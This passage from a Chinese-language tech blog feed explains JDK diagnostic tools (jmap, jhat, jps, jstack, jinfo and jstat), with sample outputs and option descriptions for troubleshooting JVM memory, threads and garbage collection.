PermSize         = 21757952 (20.75MB)  //对应jvm启动参数-XX:PermSize=&lt;value&gt;:设置JVM堆的‘永生代’的初始大小</span><br><span class="line">     MaxPermSize      = 85983232 (82.0MB)//对应jvm启动参数-XX:MaxPermSize=&lt;value&gt;:设置JVM堆的‘永生代’的最大大小</span><br><span class="line">     G1HeapRegionSize = 0 (0.0MB)  </span><br><span class="line"></span><br><span class="line">  Heap Usage://堆内存使用情况</span><br><span class="line">  PS Young Generation</span><br><span class="line">  Eden Space://Eden区内存分布</span><br><span class="line">     capacity = 33030144 (31.5MB)//Eden区总容量</span><br><span class="line">     used     = 1524040 (1.4534378051757812MB)  //Eden区已使用</span><br><span class="line">     free     = 31506104 (30.04656219482422MB)  //Eden区剩余容量</span><br><span class="line">     4.614088270399305% used //Eden区使用比率</span><br><span class="line">  From Space:  //其中一个Survivor区的内存分布</span><br><span class="line">     capacity = 5242880 (5.0MB)</span><br><span class="line">     used     = 0 (0.0MB)</span><br><span class="line">     free     = 5242880 (5.0MB)</span><br><span class="line">     0.0% used</span><br><span class="line">  To Space:  //另一个Survivor区的内存分布</span><br><span class="line">     capacity = 5242880 (5.0MB)</span><br><span class="line">     used     = 0 (0.0MB)</span><br><span class="line">     free     = 5242880 (5.0MB)</span><br><span class="line">     0.0% used</span><br><span class="line">  PS Old Generation //当前的Old区内存分布</span><br><span class="line">     capacity = 86507520 (82.5MB)</span><br><span class="line">     used     = 0 (0.0MB)</span><br><span class="line">     free     = 86507520 (82.5MB)</span><br><span class="line">     0.0% used</span><br><span class="line">  PS Perm Generation//当前的 “永生代” 内存分布</span><br><span class="line">     capacity = 22020096 (21.0MB)</span><br><span class="line">     used     = 2496528 (2.3808746337890625MB)</span><br><span class="line">     free     = 19523568 (18.619125366210938MB)</span><br><span class="line">     11.337498256138392% used  </span><br><span class="line"></span><br><span class="line">  670 interned Strings occupying 43720 bytes.</span><br></pre></td></tr></table></figure><p>可以很清楚的看到Java堆中各个区域目前的情况。</p><p>-histo<br>打印堆的对象统计，包括对象数、内存大小等等 （因为在dump:live前会进行full gc，如果带上live则只统计活对象，因此不加live的堆大小要大于加live堆的大小 ）</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> jmap -histo:live 28920 | more</span></span><br><span class="line"> num     #instances         #bytes  class name</span><br><span class="line">----------------------------------------------</span><br><span class="line">   1:         83613       12012248  &lt;constMethodKlass&gt;</span><br><span class="line">   2:         23868       11450280  [B</span><br><span class="line">   3:         83613       10716064  &lt;methodKlass&gt;</span><br><span class="line">   4:         76287       10412128  [C</span><br><span class="line">   5:          8227        9021176  &lt;constantPoolKlass&gt;</span><br><span class="line">   6:          8227        5830256  &lt;instanceKlassKlass&gt;</span><br><span class="line">   7:          7031        5156480  &lt;constantPoolCacheKlass&gt;</span><br><span class="line">   8:         73627        1767048  java.lang.String</span><br><span class="line">   9:          2260        1348848  &lt;methodDataKlass&gt;</span><br><span class="line">  10:          8856         849296  java.lang.Class</span><br><span class="line">  ....</span><br></pre></td></tr></table></figure><p>仅仅打印了前10行</p><p><code>xml class name</code>是对象类型，说明如下：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">B  byte</span><br><span class="line">C  char</span><br><span class="line">D  double</span><br><span class="line">F  float</span><br><span class="line">I  int</span><br><span class="line">J  long</span><br><span class="line">Z  boolean</span><br><span class="line">[  数组，如[I表示int[]</span><br><span class="line">[L+类名 其他对象</span><br></pre></td></tr></table></figure><p>64位机上使用需要使用如下方式：<br><code>jmap -J-d64 -heap pid</code></p><h2 id="jhat-解析dump并启动浏览器"><a href="#jhat-解析dump并启动浏览器" class="headerlink" title="jhat 解析dump并启动浏览器"></a>jhat 解析dump并启动浏览器</h2><p>jhat(JVM Heap Analysis Tool)命令是与jmap搭配使用，用来分析jmap生成的dump，jhat内置了一个微型的HTTP/HTML服务器，生成dump的分析结果后，可以在浏览器中查看。在此要注意，一般不会直接在服务器上进行分析，因为jhat是一个耗时并且耗费硬件资源的过程，一般把服务器生成的dump文件复制到本地或其他机器上进行分析。</p><h3 id="jhat命令格式"><a href="#jhat命令格式" class="headerlink" title="jhat命令格式"></a>jhat命令格式</h3><p><code>jhat [-stack &lt;bool&gt;] [-refs &lt;bool&gt;] [-port &lt;port&gt;] [-baseline &lt;file&gt;] [-debug &lt;int&gt;] [-version] [-h|-help] &lt;file&gt;</code></p><h3 id="jhat-option参数"><a href="#jhat-option参数" class="headerlink" title="jhat option参数"></a>jhat option参数</h3><blockquote><ul><li>-stack false|true 关闭对象分配调用栈跟踪(tracking object allocation call stack)。 如果分配位置信息在堆转储中不可用. 则必须将此标志设置为 false. 默认值为 true.&gt;</li><li>-refs false|true 关闭对象引用跟踪(tracking of references to objects)。 默认值为 true. 默认情况下, 返回的指针是指向其他特定对象的对象,如反向链接或输入引用(referrers or incoming references), 会统计/计算堆中的所有对象。</li><li>-port port-number 设置 jhat HTTP server 的端口号. 默认值 7000.</li><li>-exclude exclude-file 指定对象查询时需要排除的数据成员列表文件(a file that lists data members that should be excluded from the reachable objects query)。 例如, 如果文件列列出了 java.lang.String.value , 那么当从某个特定对象 Object o 计算可达的对象列表时, 引用路径涉及 java.lang.String.value 的都会被排除。</li><li>-baseline exclude-file 指定一个基准堆转储(baseline heap dump)。 在两个 heap dumps 中有相同 object ID 的对象会被标记为不是新的(marked as not being new). 其他对象被标记为新的(new). 在比较两个不同的堆转储时很有用.</li><li>-debug int 设置 debug 级别. 0 表示不输出调试信息。 值越大则表示输出更详细的 debug 信息.</li><li>-version 启动后只显示版本信息就退出</li><li>-J&lt; flag &gt; 因为 jhat 命令实际上会启动一个JVM来执行, 通过 -J 可以在启动JVM时传入一些启动参数. 例如, -J-Xmx512m 则指定运行 jhat 的Java虚拟机使用的最大堆内存为 512 MB. 如果需要使用多个JVM启动参数,则传入多个 -Jxxxxxx.</li></ul></blockquote><p>分析同样一个dump快照，MAT需要的额外内存比jhat要小的多的多，所以建议使用MAT来进行分析，当然也看个人偏好。</p><h3 id="浏览页面dump信息"><a href="#浏览页面dump信息" class="headerlink" title="浏览页面dump信息"></a>浏览页面dump信息</h3><p>该页面提供了几个查询功能可供使用：</p><blockquote><ul><li>All classes including platform 显示出堆中所包含的所有的类</li><li>Show all members of the rootset 从根集能引用到的对象</li><li>Show instance counts for all classes (including platform) 显示平台包括的所有类的实例数量</li><li>Show instance counts for all classes (excluding platform)</li><li>Show heap histogram 堆实例的分布表</li><li>Show finalizer summary</li><li>Execute Object Query Language (OQL) query 执行对象查询语句</li></ul></blockquote><p>一般查看堆异常情况主要看这个两个部分：<br>Show instance counts for all classes (excluding platform)，平台外的所有对象信息。</p><p>Show heap histogram 以树状图形式展示堆情况。</p><p>具体排查时需要结合代码，观察是否大量应该被回收的对象在一直被引用或者是否有占用内存特别大的对象无法被回收。</p><h3 id="jhat-OQL"><a href="#jhat-OQL" class="headerlink" title="jhat OQL"></a>jhat OQL</h3><p>jhat还提供了一种对象查询语言(Object Query Language)，OQL有点类似SQL,可以用来查询。</p><p>OQL语句的执行页面: <a href="http://localhost:7000/oql/">http://localhost:7000/oql/</a></p><p>OQL帮助信息页面为: <a href="http://localhost:7000/oqlhelp/">http://localhost:7000/oqlhelp/</a></p><p>OQL的预发可以在帮助页面查看，这里就不详细讲解了。</p><p><a href="http://www.importnew.com/18236.html">jhat</a></p>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>jvm</tag>
        <tag>jdk</tag>
      </tags>
  </entry>
  <entry>
    <title>jdk命令jps jstack jinfo</title>
    <url>/2017/10/25/jdk-jps-jstack-jinfo/</url>
    <content><![CDATA[<h1 id="JDK开发组件简介"><a href="#JDK开发组件简介" class="headerlink" title="JDK开发组件简介"></a>JDK开发组件简介</h1><p>JDK包含了一批用于Java开发的组件，自JDK 1.5开始内置，其中包括：</p><ul><li>javac：编译器，将后缀名为.java的源代码编译成后缀名为“.class”的字节码</li><li>java：运行工具，运行.class的字节码</li><li>jar：打包工具，将相关的类文件打包成一个文件</li><li>javadoc：文档生成器，从源码注释中提取文档，注释需匹配规范</li><li>jdb debugger：调试工具</li><li>jps：显示当前java程序运行的进程状态</li><li>javap：反编译程序</li><li>appletviewer：运行和调试applet程序的工具，不需要使用浏览器</li><li>javah：从Java类生成C头文件和C源文件。这些文件提供了连接胶合，使Java和C代码可进行交互。[2]</li><li>javaws：运行JNLP程序</li><li>extcheck：一个检测jar包冲突的工具</li><li>apt：注释处理工具[3]</li><li>jhat：java堆分析工具</li><li>jstack：栈跟踪程序</li><li>jstat：JVM检测统计工具</li><li>jstatd：jstat守护进程</li><li>jinfo：获取正在运行或崩溃的java程序配置信息</li><li>jmap：获取java进程内存映射信息</li><li>idlj：IDL-to-Java编译器。将IDL语言转化为java文件[4]</li><li>policytool：一个GUI的策略文件创建和管理工具</li><li>jrunscript：命令行脚本运行<br>JDK中还包括完整的JRE（Java Runtime Environment），Java运行环境，也被称为private runtime。包括了用于产品环境的各种库类，如基础类库rt.jar，以及给开发人员使用的补充库，如国际化与本地化的类库、IDL库等等。<br>JDK中还包括各种样例程序，用以展示Java API中的各部分。</li></ul><h2 id="jps"><a href="#jps" class="headerlink" title="jps"></a>jps</h2><p>Java Virtual Machine Process Status Tool,显示指定系统内所有的HotSpot虚拟机进程。与unix上的ps类似，只不过jps是用来显示java进程，可以把jps理解为ps的一个子集。使用jps时，如果没有指定hostid，它只会显示本地环境中所有的Java进程；如果指定了hostid，它就会显示指定hostid上面的java进程，不过这需要远程服务上开启了<a href="http://blog.csdn.net/fenglibing/article/details/17323515">jstatd服务</a>.<br>jps仅查找当前用户的Java进程，而不是当前系统中的所有进程。</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>jdk中的jps命令可以显示当前运行的java进程以及相关参数，它的实现机制如下：<br>java程序在启动以后，会在java.io.tmpdir指定的目录下，就是临时文件夹里，生成一个类似于hsperfdata_User的文件夹，这个文件夹里（在Linux中为/tmp/hsperfdata_{userName}/），有几个文件，名字就是java进程的pid，因此列出当前运行的java进程，只是把这个目录里的文件名列一下而已。 至于系统的参数什么，就可以解析这几个文件获得。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hollis@hos:/tmp/hsperfdata_hollis$ pwd</span><br><span class="line">/tmp/hsperfdata_hollis</span><br><span class="line">hollis@hos:/tmp/hsperfdata_hollis$ ll</span><br><span class="line">total 48</span><br><span class="line">drwxr-xr-x 2 hollis hollis  4096  4月 16 10:54 ./</span><br><span class="line">drwxrwxrwt 7 root   root   12288  4月 16 10:56 ../</span><br><span class="line">-rw------- 1 hollis hollis 32768  4月 16 10:57 2679</span><br><span class="line">hollis@hos:/tmp/hsperfdata_hollis$</span><br></pre></td></tr></table></figure><p>上面的内容就是我机器中/tmp/hsperfdata_hollis目录下的内容，其中2679就是我机器上当前运行中的java的进程的pid，我们执行jps验证一下：</p><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="symbol">hollis@</span>hos:/tmp/hsperfdata_hollis$ jps</span><br><span class="line"><span class="number">2679</span> org.ec lipse.equinox.launcher_1<span class="number">.3</span><span class="number">.0</span>.v20130327<span class="number">-1440.</span>jar</span><br><span class="line"><span class="number">4445</span> Jps</span><br></pre></td></tr></table></figure><p>执行了jps命令之后，我们发现有两个java进程，一个是pid为2679的eclipse运行的进程，另外一个是pid为4445的jps使用的进程（他也是java命令，也要开一个进程）</p><h3 id="命令格式"><a href="#命令格式" class="headerlink" title="命令格式"></a>命令格式</h3><p><code>jps [options] [hostid]</code></p><h3 id="option参数"><a href="#option参数" class="headerlink" title="option参数"></a>option参数</h3><p>· -l : 输出主类全名或jar路径<br>· -q : 只输出LVMID,即忽略输出的类名、Jar名以及传递给main方法的参数，只输出pid<br>· -m : 输出JVM启动时传递给main()的参数，如果是内嵌的JVM则输出为null。<br>· -v : 输出JVM启动时显示指定的JVM参数<br>· -V : 输出通过标记的文件传递给JVM的参数（.hotspotrc文件，或者是通过参数-XX:Flags=<filename>指定的文件）。<br>· -J : 用于传递jvm选项到由javac调用的java加载器中，例如，“-J-Xms48m”将把启动内存设置为48M，使用-J选项可以非常方便的向基于Java的开发的底层虚拟机应用程序传递参数。</filename></p><h3 id="hostid"><a href="#hostid" class="headerlink" title="hostid"></a>hostid</h3><p>hostid指定了目标的服务器，它的语法如下：<br>[protocol:][[//]hostname][:port][/servername]<br>· protocol - 如果protocol及hostname都没有指定，那表示的是与当前环境相关的本地协议，如果指定了hostname却没有指定protocol，那么protocol的默认就是rmi。<br>· hostname - 服务器的IP或者名称，没有指定则表示本机。<br>· port - 远程rmi的端口，如果没有指定则默认为1099。<br>· Servername - 注册到RMI注册中心中的jstatd的名称。</p><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> jps -lmv</span></span><br><span class="line">13352 sun.tools.jps.Jps -lmv -Dapplication.home=D:\Program Files\Java\jdk1.8.0_102 -Xms8m</span><br></pre></td></tr></table></figure><p><a href="http://blog.csdn.net/fenglibing/article/details/6411932">jps命令</a></p><h3 id="JPS失效处理"><a href="#JPS失效处理" class="headerlink" title="JPS失效处理"></a>JPS失效处理</h3><p>现象： 用ps -ef|grep java能看到启动的java进程，但是用jps查看却不存在该进程的id。待会儿解释过之后就能知道在该情况下，jconsole、jvisualvm可能无法监控该进程，其他java自带工具也可能无法使用</p><p>分析： jps、jconsole、jvisualvm等工具的数据来源就是这个文件（/tmp/hsperfdata_userName/pid)。所以当该文件不存在或是无法读取时就会出现jps无法查看该进程号，jconsole无法监控等问题</p><p>原因：</p><p>（1）、磁盘读写、目录权限问题 若该用户没有权限写/tmp目录或是磁盘已满，则无法创建/tmp/hsperfdata_userName/pid文件。或该文件已经生成，但用户没有读权限</p><p>（2）、临时文件丢失，被删除或是定期清理 对于linux机器，一般都会存在定时任务对临时文件夹进行清理，导致/tmp目录被清空。这也是我第一次碰到该现象的原因。常用的可能定时删除临时目录的工具为crontab、redhat的tmpwatch、ubuntu的tmpreaper等等</p><p>这个导致的现象可能会是这样，用jconsole监控进程，发现在某一时段后进程仍然存在，但是却没有监控信息了。</p><p>（3）、java进程信息文件存储地址被设置，不在/tmp目录下 上面我们在介绍时说默认会在/tmp/hsperfdata_userName目录保存进程信息，但由于以上1、2所述原因，可能导致该文件无法生成或是丢失，所以java启动时提供了参数(-Djava.io.tmpdir)，可以对这个文件的位置进行设置，而jps、jconsole都只会从/tmp目录读取，而无法从设置后的目录读物信息，这是我第二次碰到该现象的原因</p><p>附：</p><p>1.如何给main传递参数 在eclipse中，鼠标右键-&gt;Run As-&gt;Run COnfiguations-&gt;Arguments-&gt;在Program arguments中写下要传的参数值</p><p>1.如何给JVM传递参数 在eclipse中，鼠标右键-&gt;Run As-&gt;Run COnfiguations-&gt;Arguments-&gt;在VM arguments中写下要传的参数值（一般以-D开头）</p><p><a href="http://www.importnew.com/18132.html">Java命令学习系列（1）：Jps</a></p><h2 id="jstack-检查线程运行情况，是否有死锁"><a href="#jstack-检查线程运行情况，是否有死锁" class="headerlink" title="jstack (检查线程运行情况，是否有死锁)"></a>jstack (检查线程运行情况，是否有死锁)</h2><p>Java Stack Trace,用于生成给定的java进程ID或core file或远程调试服务的Java虚拟机当前时刻堆栈信息的线程快照。线程快照是当前java虚拟机内每一条线程正在执行的方法堆栈的集合，生成线程快照的主要目的是定位线程出现长时间停顿的原因，如线程间死锁、死循环、请求外部资源导致的长时间等待等。 线程出现停顿的时候通过jstack来查看各个线程的调用堆栈，就可以知道没有响应的线程到底在后台做什么事情，或者等待什么资源。 如果是在64位机器上，需要指定选项”-J-d64”，Windows的jstack使用方式只支持以下的这种方式：<br><code>jstack [-l] pid</code><br>如果java程序崩溃生成core文件，jstack工具可以用来获得core文件的java stack和native stack的信息，从而可以轻松地知道java程序是如何崩溃和在程序何处发生问题。另外，jstack工具还可以附属到正在运行的java程序中，看到当时运行的java程序的java stack和native stack的信息, 如果现在运行的java程序呈现hung的状态(死锁)，jstack是非常有用的。</p><h3 id="命令格式-1"><a href="#命令格式-1" class="headerlink" title="命令格式"></a>命令格式</h3><p><code>jstack [ option ] pid</code><br><code>jstack [ option ] executable core</code><br><code>jstack [ option ] [server-id@]remote-hostname-or-IP</code></p><p>· executable Java executable from which the core dump was produced.<br>(可能是产生core dump的java可执行程序)<br>· core 将被打印信息的core dump文件<br>· remote-hostname-or-IP 远程debug服务的主机名或ip<br>· server-id 唯一id,假如一台主机上多个远程debug服务<br>· pid 需要被打印配置信息的java进程id,可以用jps查询.</p><h3 id="option参数-1"><a href="#option参数-1" class="headerlink" title="option参数"></a>option参数</h3><p>· -F to force a thread dump. Use when jstack<pid>does not respond (process is hung)当正常输出请求(jstack [-l]<pid>)不被响应时，强制输出线程堆栈<br>· -m 如果调用到本地方法的话，可以一并显示C/C++的堆栈<br>· -l 长列表. 除堆栈外，显示关于锁的附加信息.例如属于java.util.concurrent的ownable synchronizers列表.</pid></pid></p><h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h3><p>当linux出现cpu被java程序消耗过高时，可使用以下步骤查找<br>1.top查找出哪个进程消耗的cpu高</p><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">21125</span> co_ad2    <span class="number">18</span>   <span class="number">0</span> <span class="number">1817</span>m <span class="number">776</span>m <span class="number">9712</span> S  <span class="number">3.3</span>  <span class="number">4.9</span>  <span class="number">12</span>:<span class="number">03.24</span> java</span><br><span class="line"><span class="number">5284</span> co_ad     <span class="number">21</span>   <span class="number">0</span> <span class="number">3028</span>m <span class="number">2.5</span>g <span class="number">9432</span> S  <span class="number">1.0</span> <span class="number">16.3</span>   <span class="number">6629</span>:<span class="number">44</span> java</span><br><span class="line"><span class="number">21994</span> mysql     <span class="number">15</span>   <span class="number">0</span>  <span class="number">449</span>m  <span class="number">88</span>m <span class="number">5072</span> S  <span class="number">1.0</span>  <span class="number">0.6</span>  <span class="number">67582</span>:<span class="number">38</span> mysqld</span><br><span class="line"><span class="number">8657</span> co_sparr  <span class="number">19</span>   <span class="number">0</span> <span class="number">2678</span>m <span class="number">892</span>m <span class="number">9220</span> S  <span class="number">0.3</span>  <span class="number">5.7</span> <span class="number">103</span>:<span class="number">06.13</span> java</span><br></pre></td></tr></table></figure><p>这里我们分析21125这个java进程。</p><p>2.top中shift+h查找出哪个线程消耗的cpu高<br>先输入<code>top -p 21125</code>，然后再按shift+h。这里意思为只查看21125的进程，并且显示线程。</p><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">21233</span> co_ad2    <span class="number">15</span>   <span class="number">0</span> <span class="number">1807</span>m <span class="number">630</span>m <span class="number">9492</span> S  <span class="number">1.3</span>  <span class="number">4.0</span>   <span class="number">0</span>:<span class="number">05.12</span> java</span><br><span class="line"><span class="number">20503</span> co_ad2_s  <span class="number">15</span>   <span class="number">0</span> <span class="number">1360</span>m <span class="number">560</span>m <span class="number">9176</span> S  <span class="number">0.3</span>  <span class="number">3.6</span>   <span class="number">0</span>:<span class="number">46.72</span> java</span><br><span class="line"><span class="number">21134</span> co_ad2    <span class="number">15</span>   <span class="number">0</span> <span class="number">1807</span>m <span class="number">630</span>m <span class="number">9492</span> S  <span class="number">0.3</span>  <span class="number">4.0</span>   <span class="number">0</span>:<span class="number">00.72</span> java</span><br><span class="line"><span class="number">22673</span> co_ad2    <span class="number">15</span>   <span class="number">0</span> <span class="number">1807</span>m <span class="number">630</span>m <span class="number">9492</span> S  <span class="number">0.3</span>  <span class="number">4.0</span>   <span class="number">0</span>:<span class="number">03.12</span> java</span><br></pre></td></tr></table></figure><p>这里我们分析21233这个线程，并且注意的是，这个线程是属于21125这个进程的。</p><p>3.jstack查找这个线程的信息<br>jstack [进程]|grep -A 10 [线程的16进制]<br>即：<br><code>jstack 21125|grep -A 10 52f1</code></p><p>-A 10表示查找到所在行的后10行。21233用计算器转换为16进制52f1，注意字母是小写。<br>结果：</p><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="string">"http-8081-11"</span> daemon prio=<span class="number">10</span> tid=<span class="number">0</span>x00002aab049a1800 nid=<span class="number">0</span>x52f1 <span class="keyword">in</span> Object.wait() [<span class="number">0</span>x0000000042c75000]</span><br><span class="line">   java<span class="selector-class">.lang</span><span class="selector-class">.Thread</span><span class="selector-class">.State</span>: WAITING (on <span class="selector-tag">object</span> monitor)</span><br><span class="line">     at java<span class="selector-class">.lang</span><span class="selector-class">.Object</span>.wait(Native Method)</span><br><span class="line">     at java<span class="selector-class">.lang</span><span class="selector-class">.Object</span>.wait(Object<span class="selector-class">.java</span>:<span class="number">485</span>)</span><br><span class="line">     at org<span class="selector-class">.apache</span><span class="selector-class">.tomcat</span><span class="selector-class">.util</span><span class="selector-class">.net</span>.JIoEndpoint<span class="variable">$Worker</span>.await(JIoEndpoint<span class="selector-class">.java</span>:<span class="number">416</span>)</span><br></pre></td></tr></table></figure><p>说不定可以一下子定位到出问题的代码。<br><a href="http://flysnowxf.iteye.com/blog/1162691">原文链接</a></p><p><a href="http://www.importnew.com/18176.html">其他死锁分析</a></p><h2 id="jinfo（Java7后不再使用）"><a href="#jinfo（Java7后不再使用）" class="headerlink" title="jinfo（Java7后不再使用）"></a>jinfo（Java7后不再使用）</h2><p>jinfo(JVM Configuration info)这个命令作用是实时查看和调整虚拟机运行参数。 之前的jps -v口令只能查看到显示指定的参数，如果想要查看未被显示指定的参数的值就要使用jinfo口令.<br>另外，Java7的官方文档指出，这一命令在后续的版本中不再使用。</p><h3 id="命令格式-2"><a href="#命令格式-2" class="headerlink" title="命令格式"></a>命令格式</h3><p><code>jinfo [option] [args] LVMID</code><br>或 <code>jinfo [option] &lt;executable &lt;core&gt;</code><br>或 <code>jinfo [option] [server_id@]&lt;remote server IP or hostname&gt;</code></p><h3 id="option参数-2"><a href="#option参数-2" class="headerlink" title="option参数"></a>option参数</h3><p>· -flag<name>输出指定JVM args参数的值<br>· -flag [+|-]<name>启用或禁用指定JVM args参数<br>· -flag<name>=<value>对指定JVM args参数设值<br>· -flags 不需要args参数，输出所有JVM参数的值<br>· -sysprops 输出系统属性，等同于System.getProperties()<br>·<no option>to print both of the above<br>· -h | -help to print this help message</no></value></name></name></name></p><h3 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h3><p>查看<pid>2333的MaxPerm大小可以用<br><code>jinfo -flag MaxPermSize 2333</code></pid></p>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>jvm</tag>
        <tag>jdk</tag>
      </tags>
  </entry>
  <entry>
    <title>jdk命令jstat监视虚拟机运行时状态信息</title>
    <url>/2017/10/30/jdk-jstat/</url>
    <content><![CDATA[<h2 id="jstat简介"><a href="#jstat简介" class="headerlink" title="jstat简介"></a>jstat简介</h2><p>jstat命令(Java Virtual Machine Statistics Monitoring Tool)用于监控基于HotSpot的JVM，对其堆的使用情况进行实时的命令行的统计，使用jstat我们可以对指定的JVM做如下监控：</p><ul><li>类的加载及卸载情况</li><li>查看新生代、老生代及持久代的容量及使用情况</li><li>查看新生代、老生代及持久代的垃圾收集情况，包括垃圾回收的次数及垃圾回收所占用的时间</li><li>查看新生代中Eden区及Survior区中容量及分配情况等<br>jstat工具特别强大，它有众多的可选项，通过提供多种不同的监控维度，使我们可以从不同的维度来了解到当前JVM堆的使用情况。详细查看堆内各个部分的使用量，使用的时候必须加上待统计的Java进程号，可选的不同维度参数以及可选的统计频率参数。<br>它主要是用来显示GC及PermGen相关的信息，如果对GC不怎么了解，先看<a href="http://blog.csdn.net/fenglibing/archive/2011/04/13/6321453.aspx">这篇文章</a>否则其中即使你会使用jstat这个命令，你也看不懂它的输出。</li></ul><h2 id="命令格式"><a href="#命令格式" class="headerlink" title="命令格式"></a>命令格式</h2><p><code>jstat [ generalOption | outputOptions vmid [interval[s|ms] [count]] ]</code></p><h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><p>generalOption - 单个的常用的命令行选项，如-help, -options, 或 -version。<br>outputOptions - 一个或多个输出选项，由单个的statOption选项组成，可以和-t, -h, and -J等选项配合使用。</p><ul><li>-h<lines>用于指定每隔几行就输出列头，如果不指定，默认是只在第一行出现列头。</lines></li><li>-t<lines>用于在输出内容的第一列显示时间戳，这个时间戳代表的时JVM开始启动到现在的时间（注：在IBM JDK5中是没有这个选项的）。</lines></li><li>vmid VM的进程号，即当前运行的java进程号。</li><li>interval 间隔时间，单位可以是秒或者毫秒，通过指定s或ms确定，默认单位为毫秒。</li><li>count 打印次数，如果缺省则打印无数次。</li><li>-J<flag>用于将给定的<flag>传给java应用程序加载器，例如，“-J-Xms48m”将把启动内存设置为48M。如果想查看可以传递哪些选项到应用程序加载器中，可以相看如下的文档：<pre><code>Linux and Solaris：http://docs.oracle.com/javase/1.5.0/docs/tooldocs/solaris/java.html
Windows： http://docs.oracle.com/javase/1.5.0/docs/tooldocs/windows/java.html</code></pre></flag></flag></li><li>statOption：根据jstat统计的维度不同，可以使用如下表中的选项进行不同维度的统计，不同的操作系统支持的选项可能会不一样，可以通过-options选项，查看不同操作系统所支持选项。</li></ul><p>参数interval和count代表查询间隔和次数，如果省略这两个参数，说明只查询一次。<br>假设需要每250毫秒查询一次进程5828垃圾收集状况，一共查询5次，那命令行如下：<br><code>jstat -gc 5828 250 5</code></p><h3 id="options参数说明"><a href="#options参数说明" class="headerlink" title="options参数说明"></a>options参数说明</h3><p>选项option代表这用户希望查询的虚拟机信息，主要分为3类：类装载、垃圾收集和运行期编译状况，具体选项及作用如下：</p><p><code>jstat -class &lt;pid&gt;</code><br>eg:</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">jstat -class 11589</span><br><span class="line"> Loaded  Bytes  Unloaded  Bytes     Time   </span><br><span class="line">  7035  14506.3     0     0.0       3.67</span><br></pre></td></tr></table></figure><p><code>jstat -gc 1262 2000 20</code><br>这个命令意思就是每隔2000ms输出1262的gc情况，一共输出20次<br>输出，C即Capacity 总容量，U即Used 已使用的容量</p><p><code>jstat -gccause 进程pid</code><br>查看进程垃圾收集原因</p><table><thead><tr><th>Option</th><th>列名</th><th>Displays</th></tr></thead><tbody><tr><td>–class</td><td></td><td>监视类装载、卸载数量、总空间及类装载所耗费的时间</td></tr><tr><td></td><td>Loaded</td><td>加载了的类的数量</td></tr><tr><td></td><td>Bytes</td><td>加载了的类的大小，单为Kb</td></tr><tr><td></td><td>Unloaded</td><td>卸载了的类的数量</td></tr><tr><td></td><td>Bytes</td><td>卸载了的类的大小，单为Kb</td></tr><tr><td></td><td>Time</td><td>花在类的加载及卸载的时间</td></tr><tr><td>-compiler</td><td></td><td>查看HotSpot中即时编译器编译情况的统计,输出JIT编译器编译过的方法、耗时等信息</td></tr><tr><td></td><td>Compiled</td><td>编译任务执行的次数</td></tr><tr><td></td><td>Failed</td><td>编译任务执行失败的次数</td></tr><tr><td></td><td>Invalid</td><td>编译任务非法执行的次数</td></tr><tr><td></td><td>Time 执行</td><td>编译花费的时间</td></tr><tr><td></td><td>FailedType</td><td>最后一次编译失败的编译类型</td></tr><tr><td></td><td>FailedMethod</td><td>最后一次编译失败的类名及方法名</td></tr><tr><td>-gc</td><td></td><td>查看JVM中堆的垃圾收集情况的统计,监视Java堆状况，包括Eden区、2个Survivor区、老年代、永久代等的容量</td></tr><tr><td></td><td>S0C</td><td>新生代中Survivor space中S0当前容量的大小（KB）</td></tr><tr><td></td><td>S1C</td><td>新生代中Survivor space中S1当前容量的大小（KB）</td></tr><tr><td></td><td>S0U</td><td>新生代中Survivor space中S0容量使用的大小（KB）</td></tr><tr><td></td><td>S1U</td><td>新生代中Survivor space中S1容量使用的大小（KB）</td></tr><tr><td></td><td>EC</td><td>Eden space当前容量的大小（KB）</td></tr><tr><td></td><td>EU</td><td>Eden space容量使用的大小（KB）</td></tr><tr><td></td><td>OC</td><td>Old space当前容量的大小（KB）</td></tr><tr><td></td><td>OU</td><td>Old space使用容量的大小（KB）</td></tr><tr><td></td><td>PC</td><td>Permanent space当前容量的大小（KB）</td></tr><tr><td></td><td>PU</td><td>Permanent space使用容量的大小（KB）</td></tr><tr><td></td><td>YGC</td><td>从应用程序启动到采样时发生 Young GC 的次数</td></tr><tr><td></td><td>YGCT</td><td>从应用程序启动到采样时 Young GC 所用的时间(秒)</td></tr><tr><td></td><td>FGC</td><td>从应用程序启动到采样时发生 Full GC 的次数</td></tr><tr><td></td><td>FGCT</td><td>从应用程序启动到采样时 Full GC 所用的时间(秒)</td></tr><tr><td></td><td>GCTT</td><td>从应用程序启动到采样时用于垃圾回收的总时间(单位秒)，它的值等于YGC+FGC</td></tr><tr><td>-gccapacity</td><td></td><td>监视内容与-gc基本相同，但输出主要关注Java堆各个区域使用到的最大和最小空间,查看新生代、老生代及持久代的存储容量情况</td></tr><tr><td></td><td>NGCMN</td><td>新生代的最小容量大小（KB）</td></tr><tr><td></td><td>NGCMX</td><td>新生代的最大容量大小（KB）</td></tr><tr><td></td><td>NGC</td><td>当前新生代的容量大小（KB）</td></tr><tr><td></td><td>S0C</td><td>当前新生代中survivor space 0的容量大小（KB）</td></tr><tr><td></td><td>S1C</td><td>当前新生代中survivor space 1的容量大小（KB）</td></tr><tr><td></td><td>EC</td><td>Eden 